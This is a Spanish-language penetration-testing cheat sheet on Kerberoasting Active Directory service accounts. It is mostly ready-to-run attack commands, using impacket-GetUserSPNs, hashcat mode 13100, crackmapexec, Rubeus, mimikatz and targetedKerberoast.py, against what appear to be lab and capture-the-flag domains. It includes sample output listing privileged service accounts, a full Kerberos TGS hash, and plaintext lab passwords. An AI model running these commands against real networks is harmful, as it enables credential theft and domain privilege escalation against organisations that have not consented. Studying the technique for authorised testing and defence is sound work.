# Kerberoasting

- Este ataque sirve para obtener credenciales de cuentas de servicios que están configurados con la autenticación Kerberos.
- En AD comunmente las cuentas de servicios tienen privilegios muy elevados.
- [Más info](https://book.hacktricks.xyz/v/es/windows-hardening/active-directory-methodology/kerberoast)
## Como funciona

1. Solicitud TGS
2. Obtener Ticket.
3. Extraerlo con mimikatz o rubeus
4. Fuerza bruta o pass the ticket

- `sudo impacket-GetUserSPNs DOMAIN.LOCAL/USER:password -dc-ip IP -request`
- Guardar hash
- `hashcat -m 13100 hash.txt wordlist.txt`

## Listar cuentas
- `impacket-GetUserSPNs -dc-ip IP DOMAIN.LOCAL/USER`
- `impacket-GetUserSPNs -request -dc-ip 172.16.139.3 -target-domain trilocor.local trilocor.local/pthorpe`
- Ejemplo:
```powershell
Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>               
sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>               
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>               
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>               
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>               
adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never> 
```

#### Chequear cuenta post crackeo
- `sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!`


## Extraer tickets desde Windows
- `Rubeus.exe asktgt /user:<usuario> /rc4:<contraseña>`
- `Rubeus.exe tgtreq /user:<usuario> /rc4:<spn>`
- `Rubeus tgtdeleg /ticket:<ticket_file>`
    - mimikatz: `mimikatz.exe "kerberos::list" "exit"`


## Targeted kerberoasting
- Hay veces que nos dan la opción de hacer kerberoasting a un usuario específico.
- Esto es enumerable con bloodhound

- `python3 targetedKerberoast.py -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb -d Administrator.htb --dc-ip 10.10.11.42`
- Recomiendo actualizar el reloj de la maquina al DC
- sudo ntpdate 10.10.11.42

```                                                                                                                                                          
┌──(kali㉿kali)-[~/targetedKerberoast]
└─$ python3 targetedKerberoast.py -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb -d Administrator.htb --dc-ip 10.10.11.42
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$Administrator.htb/ethan*$d2cc01fa83eca8ded17431506037a011$43b967cdbf4d38340035db43ec4d10a7a79aca4e97e255ff9680e236f05e094f78847407e361a07131fe0950df47e74f1d2b4d417dce7201ca0bdbc7ffba1ce78de85db45cb3e68013f2e4b33c0f6d5ea016534c014667c0cc4d95ed3203e77584355f1641ec66b2e21861a661ceaa52004a6d4ec69ddec2f80b2329e9a6915234dfcd438cd2e441aa9aecb4e63c91fcaf7c24ce8af26331b43d5c55c60b5a1623239213452e740f948219aac770cd1feaa2aaf95644ea7f2526a538f00945dcd24b234494024a0cba0d1cd60c7e81fb10232cbdeabc334ae5486169f89eebc32ff2bde2627a60e497503db27b2533edbcad8018e99ae81d452f31c13879d34d6d0741fcf4c6eb01ee4e3d19658691e630e6e250fed51a4836fc33aa0ab17928cc082e69b9a68d618187f30bb1c35070a2234e3d5171bbb8344e478fbf772cf927812369fef3647325e26517a748ac124876af09ce396544c239211be970fc95408f70f6da0514f9d9592b76382aedf6dd26d89f568ecba047e34bfb10a475ccd7b157b845483a22a6cad09f5854b6158adec4dff36303973e4132dba9b93cfc4c2cdfb7d40dfb3cdf0f510338710f5070ff4c440c03ff07fc3c4c0b23532197b855a3df1de2560de73e2ec2f69c24bd99a02b33bede193aa228aa09d1aa2de92d3aa402d0a91c1b5c64a2270a7a533746e0a158ef76a091b64133e48a3beee7b5f22642ec76f3b238a08b18a42dadcd32c4f1d809fb11876e45b7a9f8b1471301a8f30afc5c3d5f1ec4d8dc486bb2bfc5dfa89fb09da0c4db5b7777c61f30f92d9dbb194637e9219b403febe7f8a6a20eb2f289330609a6b8f60aefc0a537a7d26d8338796eb38f763b52ee17b81ee901ac8f80547b7a53fab8bc0f237fc4859fb9f37b16a82f1e5eba6977327671928d65d0d541b7c2a1eb9d4e530cc35923951b32d86cb2f80924db1e8afad6635c698e8ca868a0b5cf4b87b048dafb11f4be5a9dc20fabd62b8712dc37b826962e8a947c41148867fdaa4761796a88d40d6f70fc27996f364143a017f222626cccc0352a9980310717ca23cb8800b6dffe901fbddc3e07b62311380ef6bdad9e2e6f85a3165686f323ae68c9c2a8c8278a3bb75c308ad8e0a3ab3e2ac49ef68df6b06045c12084a1e665ea582f48a507368c848131b2ff34cbba084abeda028fe7068e294a39e18e62d18bade08943c1dea4dbf7e309a64440128b8f8ef4c0099df8be2dc3433ce074e077048443329450f7273b4fbeee4cfc0038c7d1a8660e757659bb93c2f352df19c014e9678a2565ce29ea4badd2e14ff06ea43c40c70a26533bef578a9e473d547ef509bc1a38c323330508994d0a766b502c4a8b98cdc2a8663c3d917283550c01750cfa7883fddc0e334a3cbe614cbb93470a7d95c02f9088d42eb1cff0995ebbef0e2ea4b5b54e00c371b373ca201ad395cd9cea00527fad0d6f017e8c917578759c8369180887f3b20895f233b25f34b1b7a4a927d89c915acd19d5796526d60a965d9ebf
``` 